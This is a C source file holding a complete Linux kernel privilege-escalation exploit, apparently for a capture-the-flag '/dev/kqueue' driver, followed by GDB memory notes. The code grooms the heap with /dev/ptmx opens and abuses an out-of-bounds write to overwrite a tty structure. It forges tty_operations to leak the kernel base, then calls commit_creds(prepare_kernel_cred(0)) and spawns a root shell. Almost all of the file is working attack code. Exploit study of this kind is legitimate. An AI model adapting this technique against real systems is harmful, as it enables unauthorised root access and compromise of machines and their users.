// gcc -masm=intel -static ./exp.c -o exp
#include <sys/xattr.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <linux/userfaultfd.h>
#include <sys/types.h>
#include <stdio.h>
#include <pthread.h>
#include <errno.h>
#include <unistd.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>
#include <poll.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/ioctl.h>
#include <poll.h>
#include <stdint.h>

#define CREATE_KQUEUE 0xDEADC0DE
#define EDIT_KQUEUE   0xDAADEEEE
#define DELETE_KQUEUE 0xBADDCAFE
#define SAVE          0xB105BABE

void errExit(char* msg)
{
  puts(msg);
  exit(-1);
}

typedef int __attribute__((regparm(3)))(*_commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((reparm(3)))(*_prepare_kernel_cred)(unsigned long cred);
_commit_creds commit_creds;
_prepare_kernel_cred prepare_kernel_cred;
void get_root_payload(void)
{
    commit_creds(prepare_kernel_cred(0));
}

void getShell() {
    printf("%d\n",getuid());
   if (getuid() == 0) {
      printf("[+]Rooted!!\n");
      system("/bin/sh");
   } else {
      printf("[+]Root Fail!!\n");
   }
}

int leak_addr() {
  asm __volatile__(
    "mov rax, qword ptr [rsp + 0x8];"
    );
}

typedef struct{
    uint32_t max_entries;
    uint16_t data_size;
    uint16_t entry_idx;
    uint16_t queue_idx;
    char* data;
}request_t;

int fd;

void create_kqueue(int max_entries, int data_size){
  request_t request;
  request.max_entries = max_entries;  // >=1
  request.data_size = data_size;      // <=0x20
  request.entry_idx = 0;
  request.queue_idx = 0;
  request.data = 0;
  ioctl(fd, CREATE_KQUEUE, &request);
}

void delete_kqueue(int queue_idx){
  request_t request;
  request.max_entries = 0;
  request.data_size = 0;
  request.entry_idx = 0;
  request.queue_idx = queue_idx;
  request.data = 0;
  ioctl(fd, DELETE_KQUEUE, &request);
}

void edit_kqueue(int queue_idx, int entry_idx, size_t data){ // change kqueue_entry->data or queue->data
  request_t request;
  request.max_entries = 0;
  request.data_size = 0;
  request.entry_idx = entry_idx;
  request.queue_idx = queue_idx;
  request.data = data;
  ioctl(fd, EDIT_KQUEUE, &request);
}

void save_kqueue_entries(int queue_idx, int max_entries, int data_size){
  request_t request;
  request.max_entries = max_entries;
  request.data_size = data_size;
  request.entry_idx = 0;
  request.queue_idx = queue_idx;
  request.data = 0;
  ioctl(fd, SAVE, &request);
}

int main(){
    int  ptmx,i;
    fd = open("/dev/kqueue", O_RDONLY);
    if (fd<0) errExit("[-] open error");
    printf("[] leak_addr() address: %p\n", &leak_addr);
// Step 1: dui fengshui
    for (i=0; i<=9; i++)      
      ptmx = open("/dev/ptmx", O_RDONLY);
// Step 2: construct 5 kqueue
    int num_entries = (0x3f0 - 0x20) / 0x18;
    create_kqueue(num_entries, 0x20);  // 0
    create_kqueue(num_entries, 0x20);  // 1
    create_kqueue(num_entries, 0x20);  // 2
    create_kqueue(num_entries, 0x20);  // 3
    create_kqueue(num_entries, 0x20);  // 4    layout: 2 -> 1 -> 0 -> ... -> 4 -> 3
// Step 3: construct fake_ptmx and tty_operations
    uint64_t tty_operations[0x100];
    for (i=0; i<0x100; i++)
      tty_operations[i] = (uint64_t)&leak_addr;

    uint64_t fake_ptmx[4];
    fake_ptmx[0]=0x100005401;
    fake_ptmx[1]=tty_operations;
    fake_ptmx[2]=tty_operations;
    fake_ptmx[3]=tty_operations;

    for (i=0; i<=num_entries; i++)
      edit_kqueue(3, i, &fake_ptmx);
// Step 4: use oob to modify ptmx
    delete_kqueue(1);
    ptmx = open("/dev/ptmx", O_RDONLY);

    delete_kqueue(2);   // new_queue will take up queue 2, then overflow queue 1 (occupied by ptmx)
    int oob_entries = 0x400 / 0x20;
    save_kqueue_entries(3, oob_entries, 0x20);
// Step 5: leak kernel address
    uint64_t ret = ioctl(ptmx, 0, NULL);
    uint64_t kernel_base = ret - 0x49510d;
    printf("[+] kernel_base = %p\n", kernel_base);

    commit_creds = kernel_base + 0x8c140;
    prepare_kernel_cred = kernel_base + 0x8c580;
// Step 6: escape privilege
    for(i=0; i<0x100; i++)
      tty_operations[i] = &get_root_payload;

    ioctl(ptmx, 0, NULL);
    getShell();
    return 0;
}
/*
create_kqueue():
  .text:0000000000000345                 mov     ds:kqueues[rbx*8], r15
  b *0xffffffffc0000000+0x345

check kqueues  0xffffffffc0002520
gdb-peda$ x /10xg 0xffffffffc0002520      // without dui fengshui
0xffffffffc0002520: 0xffff88801dc13800  0xffff88801dc13000
0xffffffffc0002530: 0xffff88801e3d1400  0xffff88801e3d7c00
0xffffffffc0002540: 0xffff88801e3d7800  0x0000000000000004

gdb-peda$ x /10xg 0xffffffffc0002520      // after dui fengshui
0xffffffffc0002520: 0xffff88801dc92800  0xffff88801dc92400
0xffffffffc0002530: 0xffff88801dc92000  0xffff88801dc98c00
0xffffffffc0002540: 0xffff88801dc98800  0x0000000000000004


*/